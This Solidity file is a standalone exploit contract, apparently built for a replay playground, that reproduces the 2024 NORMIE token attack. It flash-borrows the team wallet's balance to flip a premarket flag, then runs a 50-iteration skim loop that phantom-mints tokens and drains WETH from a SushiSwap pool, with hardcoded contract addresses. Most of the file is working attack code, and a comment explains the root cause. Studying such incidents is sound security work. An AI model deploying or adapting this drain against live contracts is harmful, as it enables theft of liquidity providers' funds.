// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-NORMIE).
//
// The DeFiHackLabs PoC runs the ENTIRE attack inline in the Foundry test
// contract `ContractTest` (attacker == address(this)), with the flash-loan
// callbacks (`uniswapV2Call`, `uniswapV3FlashCallback`) living on the test
// itself. There is no standalone exploit contract to deploy, so this file
// faithfully copies `testExploit()` + its two callbacks into a self-contained
// entrypoint (`run()`), keeping the same call sequence, amounts, and flash
// callback logic. No imports — minimal inline interfaces so it compiles
// anywhere.
//
// Root cause (see NORMIE_exp.md): NORMIE's `_transfer` credits the token
// contract's own balance with `+amount` on every buy made by a
// `premarket_user` — a flag any address can flip onto itself for free by
// receiving a transfer whose amount exactly matches the team wallet's current
// NORMIE balance (`_get_premarket_user`). The attacker flash-borrows exactly
// that many NORMIE from the SushiV2 pair to flip the flag, then repeatedly
// buys NORMIE (each buy phantom-mints more into the token contract) and lets
// `swapAndLiquify` dump the phantom balance for real WETH pulled out of the
// very pool NORMIE trades against. `skim()` recycles the same NORMIE through
// the pair 50 times to keep the phantom-mint / WETH-drain loop running without
// fresh capital.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniRouterV2 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract NORMIEDrain {
    address internal constant SUSHI_ROUTER_V2 = 0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891;
    address internal constant SLP = 0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f; // NORMIE/WETH SushiV2 pair
    address internal constant UNISWAP_V3_POOL = 0x67ab0E84C7f9e399a67037F94a08e5C664DC1C66;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant NORMIE = 0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200;

    /// @notice Recorded attack entrypoint — mirrors `ContractTest.testExploit()`.
    function run() external {
        // 1. Swap 2 ETH to NORMIE on SushiV2 (buy #1).
        address[] memory path1 = new address[](2);
        path1[0] = WETH;
        path1[1] = NORMIE;

        IUniRouterV2(SUSHI_ROUTER_V2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0, path1, address(this), block.timestamp
        );

        // 2. Flash Loan from SushiV2 Pair — borrow EXACTLY the team wallet's
        //    NORMIE balance (5,000,000 NORMIE) so the pair's transfer flips
        //    premarket_user[this] = true in _get_premarket_user.
        IUniswapV2Pair(SLP).swap(0, 5_000_000_000_000_000, address(this), hex"01");

        // 4. Flash Loan from UniswapV3Pool — sources the working capital for
        //    the cash-out sell in the callback below.
        IUniPairV3(UNISWAP_V3_POOL).flash(address(this), 0, 11_333_141_501_283_594, hex"");
    }

    /// @notice SushiV2 flash-swap callback — repays the flash loan by
    ///         transferring all received NORMIE back to the pair. This is the
    ///         exact transfer whose `amount` (5,000,000 NORMIE) matches the
    ///         team wallet's balance, flipping premarket_user[this] = true.
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // 3. Transfer all NORMIE to Pair (flash-loan repayment).
        uint256 normieAfterFlashLoan = IERC20(NORMIE).balanceOf(address(this));
        IERC20(NORMIE).transfer(SLP, normieAfterFlashLoan);
    }

    /// @notice UniswapV3 flash callback — cashes out the cheaply-acquired
    ///         NORMIE, then runs the phantom-mint / swapAndLiquify drain loop
    ///         50 times via skim() recycling, then repays the V3 flash loan.
    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        // 5. Approve NORMIE to SushiRouterv2.
        IERC20(NORMIE).approve(SUSHI_ROUTER_V2, type(uint256).max);

        address[] memory path2 = new address[](2);
        path2[0] = NORMIE;
        path2[1] = WETH;

        // 6. Swap 80% NORMIE to WETH on SushiV2 — the fair cash-out sell.
        IUniRouterV2(SUSHI_ROUTER_V2).swapExactTokensForETHSupportingFeeOnTransferTokens(
            9_066_513_201_026_875, 0, path2, address(this), block.timestamp
        );

        // 7. Transfer remaining NORMIE to SLP.
        uint256 normieAfterSwap = IERC20(NORMIE).balanceOf(address(this));
        IERC20(NORMIE).transfer(SLP, normieAfterSwap);

        // 8. Looping transfer and skim for 50 iterations — each buy
        //    phantom-mints NORMIE into the token contract, and once the
        //    phantom balance crosses the swap threshold, swapAndLiquify sells
        //    it for real WETH pulled out of the pool.
        for (uint256 i; i < 50; ++i) {
            IUniswapV2Pair(SLP).skim(address(this));
            IERC20(NORMIE).transfer(SLP, normieAfterSwap);
        }

        // 9. Skim but not transfer again.
        IUniswapV2Pair(SLP).skim(address(this));

        // 10. Swap 0.5 ETH... (actually 2 ETH, matching the original PoC) to
        //     NORMIE on SushiV2 — sources NORMIE to repay the V3 flash loan.
        address[] memory path1 = new address[](2);
        path1[0] = WETH;
        path1[1] = NORMIE;

        IUniRouterV2(SUSHI_ROUTER_V2).swapExactETHForTokensSupportingFeeOnTransferTokens{value: 2 ether}(
            0, path1, address(this), block.timestamp
        );

        // 11. Repay flash loan to UniV3Pool (principal + fee).
        IERC20(NORMIE).transfer(UNISWAP_V3_POOL, 11_446_472_916_296_430);
    }

    receive() external payable {}
}
